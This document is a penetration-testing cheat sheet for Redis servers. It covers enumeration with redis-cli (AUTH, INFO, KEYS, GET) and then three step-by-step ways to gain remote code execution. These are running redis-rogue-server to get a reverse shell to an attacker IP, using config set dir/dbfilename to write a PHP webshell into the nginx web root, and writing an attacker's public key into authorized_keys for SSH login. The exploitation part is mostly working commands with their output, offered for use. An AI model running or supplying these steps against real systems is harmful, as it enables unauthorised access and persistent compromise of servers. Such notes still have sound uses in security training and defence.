Redis (TCP/6379)

Open-source, in-memory data structure store used primarily as a blazing-fast database, cache, and message broker

    Enumeration

      Login

        Using the following tool we could be able to connect to the redis instance

        redis-cli -h 10.10.10.10

        In case it returns something like... means you need valid credentials

        -NOAUTH Authentication required.

        This ones can be provided once you are connected

        AUTH USERNAME PASSWORD

      Gathering data

        Once you are inside there are some useful commands which we can use in order to obtain information about the instance with the command:

        info

        Another thing we can do is listing the keyspaces At the end of the output of the last command or with the use of INFO keyspace we will find the keyspaces. It looks like

        # Keyspace
db0:keys=1,expires=0,avg_ttl=0

        In this example there is only one database (db0) and there is only one key (keys=1)

        We can select the database using

        SELECT 0

        And then dump the keys using

        KEYS *

        In case we would like to list the content of an specific key we just need to

        GET KEY_NAME

    Exploitation

      There are several ways to obtain RCE through redis and more information can be found here

      Interactive shell

        This method may not work properly even if you have a compatible version

        Using the following script we can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5). redis-rogue-server

        ./redis-rogue-server.py --rhost TARGET_IP --lhost ACCACKER_IP ACCACKER_IP

      PHP webshell

        Knowing the local path of the webserver we could be able to write malicious files in the affected server

        root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test ""
OK
10.85.0.52:6379> save
OK

        Now browse for the file in the webserver and enjoy the RCE :)

      SSH

        This method consists in adding your public key in the authorized_keys of the target machine so that way we can perform an ssh login using the user redis

        First we need to find the home of the redis user which is usually /var/lib/redis or /home/redis/.ssh the key here is to find the home of a user where we can write in the .ssh folder. If we know another one it will work as well

        Generate a ssh public-private key par on your attacker machine

        ssh-keygen -t rsa

        Write the public key to a file

        (echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt

        Import the file into redis

        cat spaced_key.txt | redis-cli -h TARGET_IP -x set id_rsa.pub

        Save ther public key to the authorized_keys file on the redes server

        redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK

        Finally if everything worked as expected your public key shoudl be inside the file of authorized_keys and then you could be able to ssh as redis

        ssh -i id_rsa redis@10.85.0.52
